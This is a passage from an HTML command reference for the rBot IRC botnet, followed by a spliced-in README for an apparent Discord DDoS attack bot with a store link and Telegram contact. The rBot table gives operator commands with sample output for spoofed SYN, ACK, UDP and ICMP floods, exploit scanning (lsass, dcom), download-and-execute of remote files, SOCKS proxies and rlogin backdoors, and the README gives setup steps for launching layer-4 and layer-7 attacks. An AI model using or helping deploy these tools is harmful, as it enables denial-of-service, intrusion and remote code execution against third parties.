&lt;<SPAN class="user">@moose</SPAN>&gt; .remove<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [MAIN]: Removing Bot.
</TD>
</TR>

<!--
rename
-->
<TR>
<TD>
rename
</TD>
<TD>
mv
</TD>
<TD>
.rename &lt;old&gt; &lt;new&gt;
</TD>
<TD>
Renames &lt;old&gt; to &lt;new&gt;
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .rename C:\Screenshot.jpg C:\hell.jpg<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [FILE]: Rename: 'C:\Screenshot' to: 'C:\hell.jpg'.
</TD>
</TR>

<!--
repeat
-->
<TR>
<TD>
repeat
</TD>
<TD>
rp
</TD>
<TD>
.rename &lt;number of times&gt; &lt;command&gt;
</TD>
<TD>
Repeats &lt;command&gt; &lt;times&gt;.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .repeat 3 ,privmsg #moose hello<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; hello<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; hello<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; hello
</TD>
</TR>

<!--
rloginserver
-->
<TR>
<TD>
rloginserver
</TD>
<TD>
rlogin
</TD>
<TD>
.rloginserver [port] [username]
</TD>
<TD>
Starts a Rlogin server. Rlogin is what the rBot creators
have done so you can remotely access the bot, without
having be on IRC.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .rloginserver<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [RLOGIND]: Server listening on IP: 216.239.33.101:37, Username: moose.
</TD>
</TR>

<!--
rloginstop
-->
<TR>
<TD>
rloginstop
</TD>
<TD>
&nbsp;
</TD>
<TD>
.rloginstop
</TD>
<TD>
Stops a rlogin server.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .rloginstop<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [RLOGIND]: Server stopped. (1 thread(s) stopped).
</TD>
</TR>

<!--
rndnick
-->
<TR>
<TD>
rndnick
</TD>
<TD>
rn
</TD>
<TD>
.rndnick
</TD>
<TD>
Change to a random nick.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .rndnick<BR />
* camel is now know as howshos
</TD>
</TR>

<!--
secure
-->
<TR>
<TD>
secure
</TD>
<TD>
sec<BR />
unsecure<BR />
unsec
</TD>
<TD>
.secure
</TD>
<TD>
Makes sure that any holes that are exploitable are patched up.
Giving it the "secure" look.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .secure<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [SECURE]: Securing system.
</TD>
</TR>

<!--
securestop
-->
<TR>
<TD>
securestop
</TD>
<TD>
&nbsp;
</TD>
<TD>
.securestop
</TD>
<TD>
Stops any securing possible.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .securestop<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [SECURE]: Securing stopped. (1 thread(s) stopped).
</TD>
</TR>

<!--
server
-->
<TR>
<TD>
server
</TD>
<TD>
se
</TD>
<TD>
.server &lt;new server&gt;
</TD>
<TD>
Updates the server to the new server.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .server irc.dal.net<BR />
&lt;<SPAN class="user">@moose</SPAN>&gt; .reconnect<BR />
[Connects to irc.dal.net...]
</TD>
</TR>

<!--
socks4
-->
<TR>
<TD>
socks4
</TD>
<TD>
s4
</TD>
<TD>
.socks4 [new server] [-a]
</TD>
<TD>
Starts a socks4 server on the computer on the port specified in 
config.h, or by a number given by command.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .socks4<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [SOCKS4]: Server started on: 216.239.33.101:28364
</TD>
</TR>

<!--
socks4stop
-->
<TR>
<TD>
socks4stop
</TD>
<TD>
&nbsp;
</TD>
<TD>
.socks4stop
</TD>
<TD>
Stops a socks4 server
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .socks4stop<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [SOCKS4]: Server stopped. (1 thread(s) stopped.)
</TD>
</TR>

<!--
status
-->
<TR>
<TD>
status
</TD>
<TD>
s
</TD>
<TD>
.status
</TD>
<TD>
Returns the uptime of the bot.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .status<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [MAIN]: Status: Ready. Bot Uptime: 11d 4h 3m.
</TD>
</TR>

<!--
sysinfo
-->
<TR>
<TD>
sysinfo
</TD>
<TD>
si
</TD>
<TD>
.sysinfo
</TD>
<TD>
Returns information about the system.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .sysinfo<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [<B>SYSINFO</b>]: [<B>CPU</b>]: 2210MHz. [<B>RAM</b>]: 1,048,576KB total, 649,216KB free.
[<B>Disk</b>]: 10,506,476KB total, 4,446,864KB free. [<B>OS</b>]: Windows XP (Service Pack 1) (5.1, Build 2600).
[<B>Sysdir</b>]: C:\WINDOWS\System32. [<B>Hostname</b>]: microsoft.com (207.46.134.155). [<B>Current User</b>]: Bill Gates.
[<B>Date</b>]: 02:Jun:2004. [<B>Time</b>]: 23:04:47. [<B>Uptime</b>]: 17d 8h 28m.
</TD>
</TR>

<!--
threads
-->
<TR>
<TD>
threads
</TD>
<TD>
t
</TD>
<TD>
.threads
</TD>
<TD>
Lists all the current threads.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .threads<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; -[Thread List]-<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; 0. [MAIN]: Bot started.<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; 1. [IDENTD]: Server running on Port: 113.<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; 2. [TCP]: Spoofed ack flooding: (24.222.212.37:337) for 120 seconds.<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; 3. [TFTP]: Server started on Port: 2183, File: C:\WINDOWS\System32\commmand.exe, Request: commmand.exe.<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; 4. [THREADS]: List threads.
</TD>
</TR>

<!--
uptime
-->
<TR>
<TD>
uptime
</TD>
<TD>
up
</TD>
<TD>
.uptime
</TD>
<TD>
Returns the uptime of the system.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .uptime<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [MAIN]: Uptime: 17d 8h 28m.
</TD>
</TR>

<!--
version
-->
<TR>
<TD>
version
</TD>
<TD>
ver
</TD>
<TD>
.version
</TD>
<TD>
Outputs the version specified in config.h.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .version<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [MAIN]: rBot-Moose
</TD>
</TR>

<!--
visit
-->
<TR>
<TD>
visit
</TD>
<TD>
v
</TD>
<TD>
.visit &lt;uri&gt; [referrer]
</TD>
<TD>
Visits &lt;uri&gt;
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .visit http://www.kernel.org<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [VISIT]: URL visited.
</TD>
</TR>

<!--
who
-->
<TR>
<TD>
who
</TD>
<TD>
&nbsp;
</TD>
<TD>
.who
</TD>
<TD>
Returns who is logged in, and the amount of slots left to fill.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .who<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; -[Login List]-<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; 0. moose!moose@internet.yahoo.com<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; 1. antelope!deer@i-own.blogspot.com<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; 2. &lt;Empty&gt;<BR />
</TD>
</TR>

<!-- 
Scanning
-->
<TR>
<TD class="headers" style="BACKGROUND: #D1D1D1;">
<A href="#scanning" name="scanning">Scanning Functions</A>
</TD>
</TR>

<!-- 
advscan 
-->
<TR>
<TD>
advscan
</TD>
<TD>
asc
</TD>
<TD>
.advscan &lt;method&gt; &lt;threads&gt; &lt;delay&gt; &lt;length&gt; [ip] [-abr]
</TD>
<TD>
Starts a scan using &lt;method&gt; (check advscan.cpp) for &lt;length&gt; with &lt;threads&gt; on a delay
of &lt;delay&gt;. If -a is specified, starts a scan using the A class on the bot. Likewise with -b. Using -r makes
the rest of the ip become random. If a,b or r aren't specified, the [ip] must be in format: A.B.C.D. X can be used
as one of the numbers, as it is evaluated as a random number.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .advscan netbios 100 5 120 -b -r<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [SCAN]: Random Port Scan started on 192.168.x.x:139 with a delay of 5 seconds for 120 minutes using 100 threads.
</TD>
</TR>

<!-- 
scan
-->
<TR>
<TD>
scan
</TD>
<TD>
sc
</TD>
<TD>
.scan &lt;ip&gt; &lt;port&gt; &lt;delay&gt;
</TD>
<TD>
Starts a port scan at &lt;ip&gt;:&lt;port&gt; with delays of &lt;delay&gt;.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .scan 24.222.212.37 445 10<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [SCAN]: Port scan started: 24.222.212.37:445 with delay: 10(ms).
</TD>
</TR>

<!-- 
scanstats
-->
<TR>
<TD>
scanstats
</TD>
<TD>
stats
</TD>
<TD>
.scanstats
</TD>
<TD>
Returns various information about a scan. Returning how many exploits there has been found.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .scanstats<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [SCAN]: Exploit Statistics: WebDav: 0, NetBios: 0, NTPass: 0, Dcom135: 0, Dcom445: 0, Dcom1025: 0, Dcom2: 0, MSSQL: 0, Beagle1: 0, Beagle2: 0, MyDoom: 0, lsass: 10, Optix: 0, UPNP: 0, NetDevil: 0, DameWare: 0, Kuang2: 0, Sub7: 0, Total: 0 in 0d 0h 0m.
</TD>
</TR>

<!-- 
scanstop
-->
<TR>
<TD>
scanstop
</TD>
<TD>
&nbsp;
</TD>
<TD>
.scanstop
</TD>
<TD>
Stops whatever scans are in progress and kills the threads.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .scanstop<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [SCAN]: Scan stopped. (11 thread(s) stopped.)
</TD>
</TR>

<!--
Clones
-->
<TR>
<TD class="headers">
<A href="#clones" name="clones">Clone Functions</A>
</TD>
</TR>

<!-- 
c_action
-->
<TR>
<TD>
c_action
</TD>
<TD>
c_a
</TD>
<TD>
.c_action &lt;thread&gt; &lt;channel/user&gt; &lt;message&gt;
</TD>
<TD>
Causes a clone (thread: &lt;thread&gt;) to do an action to &lt;channel/user&gt; with
&lt;message&gt;
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .c_action 1 #help partially stabz self<BR />
[In #help...]<BR />
* clonal partially stabz self
</TD>
</TR>

<!--
c_join
-->
<TR>
<TD>
c_join
</TD>
<TD>
c_j
</TD>
<TD>
.c_join &lt;thread&gt; &lt;channel&gt; [key]
</TD>
<TD>
Causes a clone (thread: &lt;thread&gt;) to join &lt;channel&gt; with [key]
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .c_join 1 #Chat<BR />
[In #Chat...]<BR />
* clonal has join #Chat
</TD>
</TR>

<!-- 
c_mode 
-->
<TR>
<TD>
c_mode
</TD>
<TD>
c_m
</TD>
<TD>
.c_mode &lt;thread&gt; &lt;channel&gt; &lt;modes&gt;
</TD>
<TD>
Causes a clone (thread: &lt;thread&gt;) to do &lt;modes&gt; in &lt;channel&gt;
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .c_mode 1 #chat +o moose<BR />
[In #Chat...]<BR />
* clonal has set mode +o moose
</TD>
</TR>

<!-- 
c_nick 
-->
<TR>
<TD>
c_nick
</TD>
<TD>
c_n
</TD>
<TD>
.c_nick &lt;thread&gt; &lt;new nick&gt;
</TD>
<TD>
Causes a clone (thread: &lt;thread&gt;) to change nicks to &lt;new nick&gt;
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .c_nick 1 clenal<BR />
* clonal is now know as clenal
</TD>
</TR>

<!-- 
c_privmsg 
-->
<TR>
<TD>
c_privmsg
</TD>
<TD>
c_pm
</TD>
<TD>
.c_privmsg &lt;thread&gt; &lt;channel/user&gt; &lt;message&gt;
</TD>
<TD>
Causes a clone (thread: &lt;thread&gt;) to send &lt;message&gt; to &lt;channel/user&gt;
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .c_privmsg 1 #chat Hello lusers.<BR />
[In #Chat...]<BR />
&lt;clonal&gt; Hello lusers.
</TD>
</TR>

<!-- 
c_quit 
-->
<TR>
<TD>
c_quit
</TD>
<TD>
c_q
</TD>
<TD>
.c_quit &lt;thread&gt;
</TD>
<TD>
Causes a clone (thread: &lt;thread&gt;) to quit.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .c_quit 1<BR />
* clone has quit (Quit: later.)
</TD>
</TR>

<!--
c_raw 
-->
<TR>
<TD>
c_raw
</TD>
<TD>
c_r
</TD>
<TD>
.c_raw &lt;thread&gt; &lt;irc raw&gt;
</TD>
<TD>
Causes a clone (thread: &lt;thread&gt;) to send &lt;irc raw&gt; to the server
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .c_raw 1 QUIT :wut<BR />
* clone has quit (Quit: wut)
</TD>
</TR>

<!-- 
c_rndnick
-->
<TR>
<TD>
c_rndnick
</TD>
<TD>
c_rn
</TD>
<TD>
.c_rndnick &lt;thread&gt;
</TD>
<TD>
Causes a clone (thread: &lt;thread&gt;) to change to a random nick.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .c_rndnick<BR />
* clone is now know as esfgisd
</TD>
</TR>

<!--
DDoS Floods
-->
<TR>
<TD class="headers">
<A href="#ddos" name="ddos">DDoS Functions</A>
</TD>
</TR>

<!-- 
ddos.stop
-->
<TR>
<TD>
ddos.stop
</TD>
<TD>
&nbsp;
</TD>
<TD>
.ddos.stop
</TD>
<TD>
Stops whatever DDoS threads there are.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .ddos.stop<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [DDoS] DDoS flood stopped. (1 thread(s) stopped)
</TD>
</TR>

<!-- 
ddos.syn
ddos.ack
ddos.random
-->
<TR>
<TD>
ddos.syn<BR />
ddos.ack<BR />
ddos.random<BR />
</TD>
<TD>
&nbsp;
</TD>
<TD>
.ddos.syn &lt;ip&gt; &lt;port&gt; &lt;length&gt;<BR />
.ddos.ack &lt;ip&gt; &lt;port&gt; &lt;length&gt;<BR />
.ddos.random &lt;ip&gt; &lt;port&gt; &lt;length&gt;<BR />
</TD>
<TD>
Starts a DDoS (syn, ack, or random) on &lt;ip&gt;:&lt;port&gt; for &lt;length&gt;
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .ddos.random<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [DDoS]: Flooding: (24.222.212.37:337) for 120 seconds.
</TD>
</TR>

<!-- 
icmpflood
-->
<TR>
<TD>
icmpflood
</TD>
<TD>
icmp
</TD>
<TD>
.icmpflood &lt;ip&gt; &lt;length&gt; [-r]
</TD>
<TD>
Starts a ICMP flood on &lt;ip&gt; for &lt;length&gt;. If -r is present
it spoofs the IP's.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .icmpflood 24.222.212.37 120 -r<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [ICMP]: Flooding: (24.222.212.37) for 60 seconds.
</TD>
</TR>

<!-- 
pingflood
-->
<TR>
<TD>
pingflood
</TD>
<TD>
ping<BR />
p
</TD>
<TD>
.pingflood &lt;ip&gt; &lt;packets&gt; &lt;size of packets&gt; &lt;delay&gt;
</TD>
<TD>
Sends &lt;number of packets&gt; to &lt;ip&gt; with sizes of &lt;size&gt; and
a delay of &lt;delay&gt;.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .pingflood 24.222.212.37 120 1000 4096 100<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [UDP]: Sending 1000 packets to: 24.222.212.37. Packet size: 4096, Delay: 100(ms).
</TD>
</TR>

<!-- 
pingstop
-->
<TR>
<TD>
pingstop
</TD>
<TD>
&nbsp;
</TD>
<TD>
.pingstop
</TD>
<TD>
Stops a pingflood.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .pingstop<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [PING] Ping flood stopped. (1 thread(s) stopped)
</TD>
</TR>

<!-- 
synflood
-->
<TR>
<TD>
synflood
</TD>
<TD>
syn
</TD>
<TD>
.synflood &lt;ip&gt; &lt;port&gt; &lt;length&gt;
</TD>
<TD>
Synfloods &lt;ip&gt;:&lt;port&gt; for &lt;length&gt; seconds.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .synflood 24.222.212.37 337 120<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [SYN]: Flooding: (24.222.212.37:337) for 120 seconds.
</TD>
</TR>

<!-- 
synstop
-->
<TR>
<TD>
synstop
</TD>
<TD>
&nbsp;
</TD>
<TD>
.synstop
</TD>
<TD>
Stops a synflood.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .pingstop<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [SYN]: Syn flood stopped. (1 thread(s) stopped.)
</TD>
</TR>

<!-- 
tcpflood
-->
<TR>
<TD>
tcpflood
</TD>
<TD>
tcp
</TD>
<TD>
.tcpflood &lt;method&gt; &lt;ip&gt; &lt;port&gt; &lt;length&gt; [-r]
</TD>
<TD>
Methods can be: syn, ack or random. TCP floods &lt;ip&gt;:&lt;port&gt; for &lt;length&gt; seconds.
If -r is specified, flood is spoofed.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .tcpflood ack 24.222.212.37 337 120 -r<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [TCP]: Spoofed ack flooding: (24.222.212.37:337) for 120 seconds.
</TD>
</TR>

<!-- 
udpflood
-->
<TR>
<TD>
udpflood
</TD>
<TD>
udp<BR />
u
</TD>
<TD>
.udpflood &lt;ip&gt; &lt;packets&gt; &lt;size of&gt; &lt;delay&gt; [port]
</TD>
<TD>
UDPfloods &lt;ip&gt;:[port] (&lt;packets&gt;, all sizes of &lt;size of&gt;) with a &lt;delay&gt; second delay
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .udpflood 24.222.212.37 1000 4096 100<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [UDP]: Sending 1000 packets to: 24.222.212.37. Packet size: 4096, Delay: 100(ms).
</TD>
</TR>

<!-- 
udpstop
-->
<TR>
<TD>
udpstop
</TD>
<TD>
&nbsp;
</TD>
<TD>
.udpstop
</TD>
<TD>
Stops a UDP flood.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .udpstop<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [UDP] UDP flood stopped. (1 thread(s) stopped)
</TD>
</TR>

<!--
Updating and downloading
-->
<TR>
<TD class="headers">
<A href="#download_update" name="download_update">Downloads</A>
</TD>
</TR>

<!--
download
-->
<TR>
<TD>
download
</TD>
<TD>
dl
</TD>
<TD>
.download &lt;url&gt; &lt;destination&gt; &lt;action&gt;
</TD>
<TD>
Downloads &lt;url&gt; and saves to &lt;destination&gt;. If &lt;action&gt; is 1, file
is also executed, otherwise it is just saved.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .download http://nsa.gov/file.exe c:\windows\devldr32.exe 1<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [DOWNLOAD]: Downloading URL: http://nsa.gov/file.exe to: c:\windows\devldr32.exe.<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [DOWNLOAD]: Downloaded 92.1 KB to c:\windows\devldr32.exe @ 92.1 KB/sec.<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [DOWNLOAD]: Opened: c:\windows\devldr32.exe.
</TD>
</TR>

<!--
update
-->
<TR>
<TD>
update
</TD>
<TD>
&nbsp;
</TD>
<TD>
.update &lt;url&gt; &lt;id&gt;
</TD>
<TD>
If &lt;id&gt; is different that of already on there, the file is downloaded and updated.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .update http://nsa.gov/file.exe mouse1<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [UPDATE]: Downloading update from: http://nsa.gov/file.exe.
</TD>
</TR>

<!--
Redirecting
-->
<TR>
<TD class="headers">
<A href="#redirecting" name="redirecting">Redirecting</A>
</TD>
</TR>

<!--
redirect
-->
<TR>
<TD>
redirect
</TD>
<TD>
rd
</TD>
<TD>
.redirect &lt;local port&gt; &lt;remote host&gt; &lt;remote port&gt;
</TD>
<TD>
Creates a simple TCP redirection. A basic port forwarding section.
Will forward all connections to &lt;local port&gt; to &lt;remote host&gt;:&lt;remote port&gt;.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .redirect 80 www.google.com 80<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [REDIRECT]: TCP redirect created from: 207.46.134.155:80 to: www.google.com:80.
</TD>
</TR>

<!--
redirectstop
-->
<TR>
<TD>
redirectstop
</TD>
<TD>
&nbsp;
</TD>
<TD>
.redirectstop &lt;thread&gt;
</TD>
<TD>
Stops a redirection.
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .redirectstop 1<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [REDIRECT] TCP redirect stopped. (1 thread(s) stopped)
</TD>
</TR>

<!--
TFTP Server
-->
<TR>
<TD class="headers">
<A href="#ftp" name="ftp">FTP Functions<A/>
</TD>
</TR>

<!--
tftpserver
-->
<TR>
<TD>
tftpserver
</TD>
<TD>
tftp
</TD>
<TD>
.tftpserver
</TD>
<TD>
I'm not sure what this does at the moment. I'm sure I'll work it out :-P
</TD>
<TD>
&nbsp;
</TD>
</TR>

<!--
tftpstop
-->
<TR>
<TD>
tftpstop
</TD>
<TD>
&nbsp;
</TD>
<TD>
.tftpstop
</TD>
<TD>
Stops a TFTP (Server? Download? Upload?)
</TD>
<TD>
&lt;<SPAN class="user">@moose</SPAN>&gt; .tftpstop<BR />
&lt;<SPAN class="bot">camel</SPAN>&gt; [TFTP] Server stopped. (1 thread(s) stopped)
</TD>
</TR>

<!--
upload
-->
<TR>
<TD>
upload
</TD>
<TD>
&nbsp;
</TD>
<TD>
.upload (something)
</TD>
<TD>
I have absolutely <B>no</b> idea how this one works.
</TD>
<TD>
&nbsp;
</TD>
</TR>

</TABLE>
</body>
</HTML>


## Installation:
```sh
1. Install NodeJS 12.x
2. Install Screen: apt-get install screen -y
3. Use your bot token generated at Discord Devoloper website
4. Paste the bot token on line 286 in the bot.js file
5. Copy the ROOM ID where the attack command is written and change the ROOM ID at line 3 of the file ayarlar.json
6. Customize attack commands in 2 folders attack_layer7 and attack_layer4
7. Run the command to start the bot by typing node bot.js
8. Let's have fun

```

### Log
```sh
- SMALL UPDATE ANTI SKID
- UPDATE METHODS COMMAND
- NEW GEOIP FUNCTION
```

### Credits
```sh
zxcr9999
rcong
(Thank for using <3)
```

### TOS:
```sh
I do not accept any responsibility for your use of the source code for any purpose
Remember: Purpose born to study
```

### NOTE:
```sh
LATEST RELEASE AND WITHOUT ANY ERROR
```
### Store: 
```sh
https://condi.billgang.store/
```
### CONTACT:
```sh
Telegram: @learneverything9
```
